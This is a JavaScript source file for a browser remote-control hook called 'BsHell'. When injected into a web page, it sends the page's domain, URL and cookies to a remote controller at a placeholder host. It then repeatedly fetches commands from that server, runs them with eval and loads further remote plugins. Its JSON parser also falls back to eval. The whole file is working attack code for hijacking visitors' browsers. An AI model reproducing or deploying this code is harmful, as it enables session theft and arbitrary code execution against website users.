
if(typeof JSON == "undefined") {
    window.JSON = {
	stringify: function (obj) {
	    var t = typeof (obj);
	    if (t != "object" || obj === null) {
		// simple data type
		if (t == "string") obj = '"'+obj+'"';
		return String(obj);
	    }
	    else {
		// recurse array or object
		var n, v, json = [], arr = (obj && obj.constructor == Array);
		for (n in obj) {
		    v = obj[n]; t = typeof(v);
		    if (t == "string") v = '"'+v+'"';
		    else if (t == "object" && v !== null) v = JSON.stringify(v);
		    json.push((arr ? "" : '"' + n + '":') + String(v));
		}
		return (arr ? "[" : "{") + String(json) + (arr ? "]" : "}");
	    }
	},

	parse: function (str) {
	    if (str === "") str = '""';
	    eval("var p=" + str + ";");
	    return p;
	}
    };
}

if(typeof options == "undefined")
    var options = {url:'http://exampledomain.com/bshell.php', requestMethod:'post'/*, requestHeader: 'Accept-Language'*/};

(function(options) {
    var self = this;
    
    self.url = "bshell.php";
    if(options.url)
	self.url = options.url;
    self.options = options;
    self.plugins = {};
    self.initialized_plugins = {};
    self.timer = false;
    self.stopped = false;
    self.sessionId = false;
    self.backoff = 0

    this.parseResponse = function(txt) {
	var msg;
	try {
	    eval("msg = " + txt);
	} catch(e) {
	    self.log("Exception for ''msg = " + txt + "'': " + e.message);
	    msg = {error: e.message};
	}
	return msg;
    };
    
    this.get_xhr = function()
    {
	try { return new XMLHttpRequest(); } catch(e) {}
	try { return new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) {}
	self.log("XMLHttpRequest not supported");
	return null;
    };

    this.begin_xhr = function(method, url, callback) {
	var xhr = self.get_xhr();
	xhr.open(method, url);
	xhr.onreadystatechange = function(evt) {
	    if(xhr.readyState == 4) {
		if(xhr.status == 200) {
		    setTimeout(function() {callback(xhr.responseText)}, 10);
	        } else {
		    setTimeout(function() {callback({error: "Status " + xhr.status + " for " + url})}, 10);;
		}
	    }
	}
	return xhr;
    };
    
    this.req = function(url, data, callback) {
	var packet = data || {};
	if(self.sessionId)
	    packet.sessionId = self.sessionId;
	if(typeof data == "object")
	    for(var k in data)
		packet[k] = data[k];
	self.make_request(url, packet, callback);
    };

    // Patch here to hook a request handler, such as the css_channel plugin.
    this.make_request = function(url, packet, callback) {
	switch(this.options.requestMethod) {
	case "get":
	case "post":
	    self.http_req(self.options.requestMethod,
			  url,
			  packet, 
			  callback,
			  self.options.requestHeader);
	    break;
	default:
	    if(self.plugins[this.options.requestMethod])
		self.plugins[this.options.requestMethod].make_request(url,packet,callback);
	    break;
	}
    };

    this.encode_packet = function(packet) {
	return escape(JSON.stringify(packet))
    };

    this.http_req = function(method, url,packet,callback,header_name)
    {
	var req = self.encode_packet(packet);
	if(method.toLowerCase() == "get" && typeof header_name == "undefined")
	    url = url + "?req=" + req;
	var xhr = self.begin_xhr(method, url, callback);
	if(typeof header_name != "undefined")
	    xhr.setRequestHeader(header_name, req);
	if(method.toLowerCase() == "post") {
	    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	    if(typeof header_name == "undefined") {
		xhr.send("req=" + req);
		return;
	    }
	}
	xhr.send(null);
    }
    
    this.detectSelf = function() {
	if(typeof self.script_location != "string") {
	    for(var scr in document.scripts) {
		if(/bshell\.js/.test(document.scripts[scr].src)) {
		    self.script_location = document.scripts[scr].src;
		    self.log("detected myself at " + self.script_location);
		}
	    }
	}
	return self.script_location;
    };

    this.resumeSession = function() {
	var cook = self.readCookie("BsHell");
	if(cook) {
	    self.sessionId = cook;
	    self.log("resumed session from cookie:" + self.sessionId);
 	    return true;
	}
	return false;
    };
    
    this.readCookie = function(name) {
	try {
	    var m = document.cookie.match(/BsHell=([0-9A-Za-z]{32})/);
	    return (m && m.length == 2) ? m[1] : false;
	} catch(e) {
	    return false;
	}
    }
    
    this.stop = function() {
	if(self.timer)
	    clearTimeout(self.timer);
	self.send({cmd: "stop"});
	self.timer = false;
	self.stopped = true;
	self.log("STOPPED!");
    }
    
    this.start = function() {
	self.log("starting BsHell");
	if(typeof chrome != "undefined")
	    console.dir(chrome);
	self.detectSelf();
	if(self.options.plugins) {
	    setTimeout(self.loadPlugins, 100);
	} else {
	    self.send_initial_request();
	}
    }

    this.send_initial_request = function() {
	var packet = {
	    domain: document.domain,
	    page: document.location.href
	}
	if(window.name) {
	    packet.window_name = window.name;
	}
	try {
	    if(document.cookie) {
		packet.cookies = document.cookie;
	    }
	} catch(e) {}
	packet.cmd = this.resumeSession() ? "resume" : "start";
	self.trigger(packet);
    };
    
    this.trigger = function(data) {
	if(self.timer != false)
	    clearTimeout(self.timer);

	self.timer = setTimeout(function() {
	    self.send(data);
	}, self.backoff*1000);
    };

    this.getApi = function(code, cmdId) {
	return {
	    root_url: self.script_location.substr(0, self.script_location.lastIndexOf("/")+1),
	    plugins: self.plugins,
	    send: function(data) {
		setTimeout(function() {self.send({cmd: "result", id: cmdId, response: data});},10);
	    },
	    stop: function() {
		self.stop();
	    },
	    register_plugin: function(name, plugin) {
		self.registerPlugin(name, new plugin(self));
		this.plugins = self.plugins;
	    },
	    require_plugin: function(name) {
		return self.requirePlugin(name, code);
	    },
	    run_payload: function(name) {
		setTimeout(function() {self.send({cmd: "payload", name: name, requester: cmdId});},10);
	    }
	}
    };

    this.registerPlugin = function(name, plugin) {
	try {
	    plugin.init();
	    self.plugins[name] = plugin;
	    self.initialized_plugins[name] = 3;
	} catch(e) {
	    self.log("failed to register plugin " + name + ": " + e.message);
	}
    };

    this.requirePlugin = function(name, orig) {
	if(typeof self.plugins[name] != "undefined") {
	    return true;
	}
	self.log("requires unloaded plugin, requesting plugin " + name);
	setTimeout(function() {
	    self.req(self.url,
		     {cmd: "plugin", name: name}, 
		     function(text) {
			 self.receive(text, function(ret) {
			     if(typeof self.plugins[name] == "undefined") 
				 self.send({cmd: "result", error: "required plugin not found: " + name});
			     else if(typeof orig == "string")
				 self.receive(orig);// run original code again
			 });
		     });
	    self.log("sent request for plugin " + name);
	}, 10);
	return false;
    };

    self.loadPlugins = function(callback) {
	if(document.body == null) {
	    setTimeout(self.loadPlugins, 200);
	    return;
	}
	window.bshell = self.getApi("");
	var missing = 0;
	for(var plug in self.options.plugins) {
	    var name = self.options.plugins[plug];
	    if(typeof self.initialized_plugins[name] == "undefined") {
		self.log("loading plugin: " + name);

		var url = self.script_location.substr(0, self.script_location.lastIndexOf("/")+1);
		url += '/plugins/' + name + '/' + name + ".js";
		var scr = document.createElement('script');
		scr.setAttribute('type', 'text/javascript');
		scr.setAttribute('src', url);
		scr.onload = function() {document.body.removeChild(this);};
		document.body.appendChild(scr);

		self.initialized_plugins[name] = 1;
	    }
	    else if(self.initialized_plugins[name] == 1) {
		// wait for plugin to load
		if(typeof self.plugins[name] != "undefined")
		    self.initialized_plugins[name] = 2;
	    }
	    else if(self.initialized_plugins[name] == 2) {
		try {
		    self.initialized_plugins[name] = 3;
		    self.plugins[name].init();
		    self.log("bootstrapped plugin: " + name);
		} catch(e) {
		    self.log("failed to init plugin " + name + ":" + e.message);
		}
	    }

	    if(self.initialized_plugins[name] != 3)
		missing++;
	}

	if(missing == 0) {
	    self.log("loadPlugins: all plugins bootstrapped, send initial request");
	    setTimeout(self.send_initial_request, 50);
	}
	else {
	    setTimeout(self.loadPlugins, 50);
	}
    };

    this.receive = function(text, callback) {
	var trigger = self.trigger;
	if(self.stopped) {
	    trigger = function() {};
	}

	if(text == "[]" || text == "") {
	    if(typeof callback != "undefined")
		callback({error:'no data'});
	    trigger(false);
	    return;
	}

	var msg = self.parseResponse(text);
	if(msg.error) {
	    self.log("failed to parse message: " + text + ": " + msg.error);
	    if(typeof callback != "undefined")
		callback(msg);
	    trigger(false);
	    return;
	}

	if(msg.sessionId && (!self.sessionId || self.sessionId != msg.sessionId))
	    self.sessionId = msg.sessionId;
	if(msg.code) {
	    var cod = msg.code;
	    self.log("executing code for " + msg.id);
	    setTimeout(function() { 
		var ret={}, res = false;
		try {
		    var bshell = self.getApi(text, msg.id);
		    eval("res = " + cod);
		    ret.response = res;
		} catch(e) {
		    ret={error: e.message};
		}
		self.log("result from " + msg.id + ": ", ret);
		
		if(ret.response != false && typeof ret.response != "undefined") {
		    ret.id = msg.id;
		    ret.cmd = "result";
		    self.trigger(ret); // intentional self.trigger!
		} else {
		    trigger(false);
		}
	    	if(typeof callback == "function")
		    callback(ret);
	    }, 1);
	}
	else
	    trigger(false);
    };

    this.send = function(data) {
	self.backoff = (data != false) ? 1 : (self.backoff < 10 ? self.backoff+self.backoff/2 : 10);
	self.req(self.url, data, self.receive);
	if(data != false)
	    self.log("sent data", data);
    };
    
    this.log = function(str, obj) {
	//uncomment to disable logging to the browser console
	//return;
	if(typeof obj != "undefined")
	    str += " => " + JSON.stringify(obj);
	console.log("LOG: " + str);
    };
    this.start();
}(options));
